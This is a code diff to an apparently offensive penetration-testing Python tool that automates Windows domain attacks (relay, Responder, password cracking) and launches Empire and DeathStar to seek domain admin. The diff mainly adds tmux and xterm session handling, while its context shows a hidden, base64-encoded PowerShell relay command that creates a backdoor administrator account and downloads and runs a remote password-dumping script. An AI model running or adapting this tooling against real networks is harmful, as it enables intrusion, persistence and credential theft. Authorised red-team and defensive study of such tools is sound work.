@@ -31,6 +31,7 @@ def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-l", "--hostlist", help="Host list file")
+    parser.add_argument("--xterm", help="Run Empire and DeathStar in xterm windows instead of tmux session. Requires --auto option to be used")
     parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
     parser.add_argument("-p", "--password-list", help="Path to password list file for attack 1's reverse bruteforce")
     parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
@@ -954,7 +955,7 @@ def run_relay_attack(iface, args):
     if args.command:
         remote_cmd = args.command
     elif args.auto:
-        remote_cmd = run_empire(iface)
+        remote_cmd = run_empire_deathstar(iface, args)
     else:
         # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
@@ -1296,6 +1297,26 @@ def run_proc_xterm(cmd):
 
     return proc
 
+def run_tmux_procs(empire_cmd, ds_cmd):
+    '''
+    Runs a process in a tmux session by the name of icebreaker
+    '''
+    cwd = os.getcwd()
+    serv = libtmux.Server()
+    sess = serv.find_where({'session_name':'icebreaker'})
+    win = sess.attached_window
+    pane = win.select_pane(0)
+    pane.send_keys('cd {}'.format(cwd))
+    pane.send_keys('pipenv shell')
+    pane.send_keys(empire_cmd)
+    time.sleep(10)
+    pane = win.split_window(attach=False)
+    pane.select_pane()
+    pane.send_keys('cd {}'.format(cwd))
+    pane.send_keys('pipenv shell')
+    pane.send_keys(ds_cmd)
+    time.sleep(5)
+
 def get_token(base_url):
     '''
     Get empire API token for further API calls
@@ -1333,7 +1354,7 @@ def get_launcher_cmd(base_url, token):
     print(r.json())
     raise
 
-def run_empire(iface):
+def run_empire_deathstar(iface, args):
     '''
     Gets the empire launcher command to run on the remote machine
     '''
@@ -1343,13 +1364,17 @@ def run_empire(iface):
     empire_cmd = 'cd submodules/Empire;python2 empire --rest --username {} --password {}'.format(user,passwd)
     ds_cmd = 'python submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(user, passwd, get_local_ip(iface))
 
-    empire_proc = run_proc_xterm(empire_cmd)
-    # Time for Empire to load
-    time.sleep(10)
-    ds_proc = run_proc_xterm(ds_cmd)
+    if args.xterm:
+        empire_proc = run_proc_xterm(empire_cmd)
+        # Time for Empire to load
+        time.sleep(10)
+        ds_proc = run_proc_xterm(ds_cmd)
+        # Time for DeathStar to start listener
+        time.sleep(5)
+    else:
+        run_tmux_procs(empire_cmd, ds_cmd)
+
     token = get_token(base_url)
-    # Time for DeathStar to start listener
-    time.sleep(5)
     launcher_cmd = get_launcher_cmd(base_url, token)
 
     return launcher_cmd
@@ -1401,7 +1426,7 @@ def main(report, args):
     prev_users = []
     loop = asyncio.get_event_loop()
     passwords = create_passwords(args)
-
+    
     # Get the interface to use with Responder, also used for local IP lookup
     if args.interface:
         iface = args.interface
@@ -1483,6 +1508,12 @@ if __name__ == "__main__":
     if os.geteuid():
         print_bad('Run as root')
         sys.exit()
+
+    if args.auto and not args.xterm:
+        print_info('Auto domain admin option selected. Open a new terminal and run this command:')
+        print('     sudo tmux new -s icebreaker')
+        input(colored('[*] ', 'blue')+'Hit enter to continue')
+
     report = parse_nmap(args)
     main(report, args)
 
